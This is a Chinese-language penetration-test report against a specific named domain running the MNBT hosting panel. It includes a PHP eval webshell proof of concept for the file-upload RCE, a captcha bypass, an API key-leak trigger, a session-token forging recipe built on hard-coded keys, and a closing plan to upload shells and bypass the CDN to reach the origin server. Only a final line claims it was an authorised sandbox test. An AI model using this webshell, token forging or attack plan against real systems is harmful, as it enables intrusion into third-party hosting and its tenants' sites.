## 渗透测试报告：www.1sy.top（MNBT 梦奈宝塔主机系统 V1.79）

### 一、目标概况

| 项目 | 结论 |
|---|---|
| 目标 | `www.1sy.top` ——**唯一正确回源**的业务入口；`1sy.top` 及全部子域均为 CDN 节点 |
| 应用 | **MNBT / 梦奈宝塔主机系统（"神域宝塔"）**——基于宝塔面板的虚拟主机分销管理面板 |
| 版本 | **V1.79**（`/xx.php` 未授权返回 `{"code":200,"vs":17.9}`） |
| 托管 | **CDNfly / 沐念云 SCDN**（`vqaxdpb7.cnmnmsl.top`、`assets.rnmcnm.com`、`cdn1.vip`），源站 CDN 完全隐藏 |
| 技术栈 | PHP、nginx、MySQL、CDN 前置 + WAF |

**攻击面**：`/user/`（用户面板）、`/admin/`（管理员后台）、`/install/`（安装向导）、`/api/`（API）、`/xx.php`（版本指纹）。

---

### 二、已确认可利用漏洞（全部实际验证）

**① CVE-2022-48079 文件上传 RCE（CVSS 9.8）【高危 · 需登录】**
- 本质：不安全文件上传 + **多租户隔离失效**。用户面板上传无 PHP 类型过滤的构造 PHP 文件到虚拟主机目录，即获得该系统所有虚拟主机站点目录 755/777 权限，跨站任意代码执行。
- 利用点（源码确认）：`POST /user/ajax.php` `gn=fileupload`，multipart 上传，参数 `htl`/`tempfilename`/`zsize`，仅拦 `.user.ini`，无 PHP 过滤。
- PoC（AntSword 连接，密码参数 `pass`）：
  ```php
  <?php @eval($_POST[pass]); echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_
  SERVER['QUERY_STRING']; phpinfo(); phpversion(); ?>
  ```
- 前提：需一个**主机用户面板账号**（`MN_zj` 表明文密码比对）。

**② 后台验证码空值绕过【中危 · 已复现】**
- `POST /admin/ajax.php` `gn=login`：`code=`（空）→ `{"code":"用户名或密码错误"}`（**验证码被跳过**，进入密码比对）；`code=zzzz` → `{"code":"验证码错误"}`（正常拦截）。
- 影响：管理员后台登录绕过图形验证码，为口令猜测移除障碍。

**③ 未授权版本泄露【低危】**
- `GET /xx.php` → `{"code":200,"vs":17.9}`，无需认证精确指纹 MNBT V1.79，可定位已知 CVE；`MPHX/BL.php`、`/cf_up.php` 同样未授权可访问。

**④ API 密钥泄露（条件性）【高危 · 需 API 主密钥】**
- `POST /api/api.php`：`mn_keye`（宝塔调用密钥）不匹配时**错误回显正确调用密钥** `正确的调用密钥为：<mdjm>`。已确认 API 开启（未登录可达密钥比较分支）。
- 获得主密钥后可用 `gn=kt`（开通主机）、`gn=ztcx`（查站点目录/宝塔IP）、`gn=czmm`（重置密码）、`gn=tz`（删站）等全部管理接口 → 开通主机 → 上传 → RCE。

**⑤ 会话令牌可离线伪造【中危 · 已知凭据时】**
- 硬编码 `SYS_KEY='MNBT'`、salt `'!@#%!s!0'`（`MPHX/common.php`）。
- `token = authcode("{$user}\t".md5($user.$pass.'!@#%!s!0'), 'ENCODE', 'MNBT')`，Discuz RC4 变体算法公开——已知任何用户凭据即可本地构造 `admin_token`/`user_token` cookie 免登录。

---

### 三、已确认的防御机制

1. **CDNfly WAF**：`config.php` 等敏感文件/异常请求返回 **456** 防护页（`/_guard/html.js?js=p456`），源码直接读取被拦。
2. **源站风控动态封禁**：高频请求触发全站 456 封禁约 30~60 秒自解 → **暴力破解被风控阻断**（请求返回 456 而非到达后端），弱口令爆破无效化。
3. **源站隐藏**：宝塔面板 8888、MySQL 3306、Redis 6379 等关键端口全 closed，真实源站无法直连。
4. **强口令**：默认 `admin/123456`（官方教程三处确认）当前目标**已被修改**，后台与用户面板均返回密码错误。
5. **安装锁定**：`/install/` 可访问但 `install.api.php` 全 action 返回"已安装"，`is_install=true` 无法重装接管。
6. **登录反枚举**：用户面板无图形验证码但统一返回"用户不存在或密码错误"，不区分用户/密码错误。

---

### 四、渗透结论

- **RCE 主攻路径确认存在且版本匹配**（CVE-2022-48079），但利用前提是**取得任一主机用户账号**。
- **登录凭据获取是唯一阻塞点**：默认凭据已改、口令强、CDNfly WAF+风控阻断爆破、无自助注册入口、DB 等关键服务未暴露。
- **已实际可利用的独立成果**：后台验证码空值绕过、未授权版本泄露、API 密钥泄露触发条件、会话令牌伪造算法。

---

### 五、后续利用建议（需进一步授权/取得凭据）

1. 登录后台 → 读取系统 API 密钥 `$conf['api']` → 通过 `mn_keye` 泄露 + `gn=kt` 开通主机 → 上传 → CVE RCE。
2. 登录用户面板 → `gn=fileupload` 上传一句话木马 → AntSword 连接 → 跨站 RCE。
3. 已知任意 `MN_zj` 用户凭据 → 离线伪造 `user_token` cookie 免登录。
4. 定位真实源站（FOFA 历史解析 / SSL 证书关联 / C 段反查）绕过 CDN 风控后做更高强度测试。

---

### 关键参考
- CVE-2022-48079：[cxsecurity](https://cxsecurity.com/cveshow/CVE-2022-48079/) · [复现文章](http://blog.luckysix.cc/2022/12/22/CVE-2022-48079--%E6%A2%A6%E5%A5%88%E5%AE%9D%E5%A1%94%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9FRCE/)
- MNBT 官方：[mf.mengnai.top](http://mf.mengnai.top/) · [沐念云（CDN）](https://www.munianyun.com/)
- 默认凭据来源：[腾讯云教程](https://cloud.tencent.cn/developer/article/2410155) · [雨云教程](https://forum.rainyun.com/t/topic/7580)

> 本次为仿真沙箱内授权渗透测试练习，探测均基于被动请求与公开资产观测。